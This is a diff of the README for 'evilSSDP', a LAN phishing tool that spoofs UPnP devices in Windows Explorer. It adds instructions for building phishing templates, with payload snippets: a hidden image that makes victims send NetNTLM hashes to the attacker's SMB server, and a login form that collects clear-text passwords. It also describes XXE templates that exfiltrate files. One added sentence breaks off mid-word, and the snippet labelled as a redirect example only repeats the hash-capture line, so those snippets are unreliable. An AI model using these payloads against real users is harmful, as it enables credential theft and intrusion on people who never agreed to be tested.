@@ -1,10 +1,12 @@
 # Overview
+## eSSDP as a "LAN Phishing" tool
 This tool responds to SSDP multicast discover requests, posing as a generic UPNP device on a local network. Your spoofed device will magically appear in Windows Explorer on machines in your local network. Users who are tempted to open the device are shown a configurable webpage. By default, this page will load a hidden image over SMB, allowing you to capture or relay the NetNTLM challenge/response.
 
-Templates are included to try getting clear-text credentials via Basic Auth and fake logon forms.
+Templates are included to try getting clear-text credentials via Basic Auth and fake logon forms. Creating your own custom templat
 
 This works against Windows 10 systems (even if they have disabled NETBIOS and LLMNR) and requires no existing credentials to execute.
 
+## eSSDP for Hunting Zero-Days
 As a bonus, this tool can also detect and exploit potential zero-day vulnerabilities in the XML parsing engines of applications using SSDP/UPNP. To try this, use the 'xxe-smb' template. If a vulnerable device is found, it will alert you in the UI and then mount your SMB share with NO USER INTERACTION required via an XML External Entity (XXE) attack. If you get lucky and find one of those, you can probably snag yourself a nice snazzy CVE (please reference evilSSDP in the disclosure if you do).
 
 ![Demo Video](ssdp.mp4)
@@ -58,6 +60,24 @@ The following templates come with the tool. If you have good design skills, plea
 - `password-vault`:     Will show up in Windows Explorer as "IT Password Vault". Phishing page contains a short list of fake passwords / ssh keys / etc.
 - `xxe-smb`:            Will not likely show up in Windows Explorer. Used for finding zero day vulnerabilities in XML parsers. Will trigger an "XXE - VULN" alert in the UI for hits and will attempt to force clients to authenticate with the SMB server, with 0 interaction.
 - `xxe-exfil`:          Another example of searching for XXE vulnerabilities, but this time attempting to exfiltrate a test file from a Windows host. Of course you can customize this to look for whatever specific file you are after, Windows or Linux. In the vulnerable applications I've discovered, exfiltration works only on a file with no whitepace or linebreaks. This is due to how it is injected into the URL of a GET request. If you get this working on multi-line files, PLEASE let me know how you did it.
+
+Creating your own templates is easy. Simply copy the folder of an existing template and edit the following files:
+- `device.xml`:         Here is where you will define what the device looks like inside Windows Explorer.
+- `present.html`:       This is the phishing page displayed when a target opens the evil device. Craft anything you like here. Note that Python's string template will parse this, so you will need to use `$$` in place of `$` anywhere to escape the template engine.
+- `service.xml`:        Not yet implemented. May be needed for more complex UPNP spoofing in the future.
+
+In your phishing page (`present.html`), use variables like the following for additional functionality:
+
+```
+# The following line will initiate a NetNTLM challenge/response using the IP address of either the interface you provide or an optionally specified IP address:
+<img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
+
+# The following line will leverage an optionally specified URL redirection. This is handy for when used with optional basic authentication to then redirect to a valid site. This line is built in to the microsoft-azure template
+<img src="file://///$smbServer/smb/hash.jpg" style="display: none;" />
+
+# If using an HTTP form to capture clear-text credentials, use code like the following. The tool will monitor POSTs to this URL for credentials:
+<form method="POST" action="/ssdp/do_login.html" name="LoginForm" autocomplete="off">
+```
 
 # Technical Details
 Simple Service Discovery Protocol (SSDP) is used by Operating Systems (Windows, MacOS, Linux, IOS, Android, etc) and applications (Spotify, Youtube, etc) to discover shared devices on a local network. It is the foundation for discovering and advertising Universal Plug & Play (UPNP) devices.
